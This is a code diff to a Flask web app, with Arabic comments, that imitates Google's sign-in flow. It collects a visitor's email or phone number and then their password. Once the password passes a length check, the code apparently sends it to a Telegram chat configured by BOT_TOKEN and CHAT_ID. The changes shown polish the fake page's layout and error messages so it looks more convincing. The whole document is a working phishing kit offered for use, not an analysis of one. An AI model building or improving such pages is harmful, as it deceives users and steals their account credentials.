@@ -12,13 +12,14 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: المسافات أصبحت مضبوطة وزر التالي مرفوع للأعلى
+# الصفحة الأولى: التحقق من صحة الإيميل أو رقم الهاتف
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
   if request.method == "POST":
     email_val = request.form.get("email", "").strip()
 
+    # شروط البريد الإلكتروني أو الهاتف
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
@@ -27,7 +28,7 @@ def step1():
     ):
       error = (
           "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد"
-          " الإلكتروني."
+          " الإلكتروني أو رقم الهاتف."
       )
     else:
       session["user_email"] = email_val
@@ -52,7 +53,7 @@ def step1():
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
-            padding: 16px;
+            padding: 12px 16px;
         }
         
         .login-container {
@@ -62,23 +63,23 @@ def step1():
             flex-direction: column;
             align-items: center;
             text-align: center;
-            margin-top: 5px;
+            margin-top: 2px;
         }
 
         .google-g {
-            width: 38px;
-            height: 38px;
-            margin-bottom: 6px;
+            width: 36px;
+            height: 36px;
+            margin-bottom: 4px;
         }
 
-        .title { font-size: 21px; font-weight: 400; color: #202124; margin-bottom: 4px; }
-        .subtitle { font-size: 13px; color: #5f6368; margin-bottom: 3px; line-height: 1.35; }
+        .title { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 3px; }
+        .subtitle { font-size: 12.5px; color: #5f6368; margin-bottom: 2px; line-height: 1.3; }
         
         .info-link {
-            font-size: 13px;
+            font-size: 12.5px;
             color: #1a73e8;
             text-decoration: none;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             display: inline-block;
         }
         .info-link:hover { text-decoration: underline; }
@@ -87,7 +88,7 @@ def step1():
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 10px; 
+            margin-bottom: 8px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
@@ -96,10 +97,10 @@ def step1():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 8px; }
+        .input-group { width: 100%; margin-bottom: 6px; }
         .input-group input {
             width: 100%;
-            padding: 13px 14px;
+            padding: 12px 14px;
             font-size: 15px;
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -107,15 +108,16 @@ def step1():
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 11px 13px; }
 
         .links-container {
             width: 100%;
             display: flex;
             flex-direction: column;
             align-items: flex-start;
-            gap: 16px; /* زيادة المسافة بين الرابطين كما طلبت */
+            gap: 10px;
             padding: 0 2px;
+            margin-top: 4px;
         }
         .links-container a {
             color: #1a73e8;
@@ -131,7 +133,7 @@ def step1():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 25px; /* رفع زر التالي للأعلى أكثر */
+            padding-bottom: 60px;
         }
 
         .submit-btn {
@@ -139,7 +141,7 @@ def step1():
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 11px 30px;
+            padding: 11px 28px;
             font-size: 15px;
             font-weight: 500;
             cursor: pointer;
@@ -187,7 +189,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور مع نفس التنسيق والثبات
+# الصفحة الثانية: شرط أن تكون كلمة المرور أطول من 5 أحرف (أكثر من 5)
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -198,8 +200,11 @@ def step2():
   if request.method == "POST":
     password = request.form.get("password", "")
 
-    if len(password) <= 6:
-      error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
+    # شرط أن تكون كلمة المرور أطول من 5 أحرف (أي 6 أحرف فأكثر)
+    if len(password) <= 5:
+      error = (
+          "كلمة المرور قصيرة جداً. يجب أن تكون كلمة المرور أطول من 5 أحرف."
+      )
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
@@ -231,7 +236,7 @@ def step2():
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
-            padding: 16px;
+            padding: 12px 16px;
         }
         
         .login-container {
@@ -241,14 +246,14 @@ def step2():
             flex-direction: column;
             align-items: center;
             text-align: center;
-            margin-top: 10px;
+            margin-top: 5px;
         }
 
         .google-logo {
-            font-size: 23px;
+            font-size: 22px;
             font-weight: 500;
             color: #202124;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -262,27 +267,27 @@ def step2():
         .google-logo span span:nth-child(5) { color: #34A853; }
         .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        .title { font-size: 21px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        .title { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 6px; }
         
         .user-chip {
             display: inline-flex;
             align-items: center;
-            padding: 4px 12px 4px 4px;
+            padding: 3px 10px 3px 3px;
             border: 1px solid #dadce0;
             border-radius: 100px;
-            margin-bottom: 16px;
-            font-size: 13px;
+            margin-bottom: 14px;
+            font-size: 12.5px;
             color: #3c4043;
-            gap: 8px;
+            gap: 6px;
             background: #fff;
         }
-        .user-chip svg { width: 18px; height: 18px; }
+        .user-chip svg { width: 16px; height: 16px; }
 
         .error-msg { 
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 10px; 
+            margin-bottom: 8px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
@@ -291,10 +296,10 @@ def step2():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 12px; }
+        .input-group { width: 100%; margin-bottom: 10px; }
         .input-group input {
             width: 100%;
-            padding: 13px 14px;
+            padding: 12px 14px;
             font-size: 15px;
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -302,7 +307,7 @@ def step2():
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 11px 13px; }
 
         .footer-action {
             width: 100%;
@@ -310,7 +315,7 @@ def step2():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 25px;
+            padding-bottom: 60px;
         }
 
         .submit-btn {
@@ -318,7 +323,7 @@ def step2():
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 11px 30px;
+            padding: 11px 28px;
             font-size: 15px;
             font-weight: 500;
             cursor: pointer;
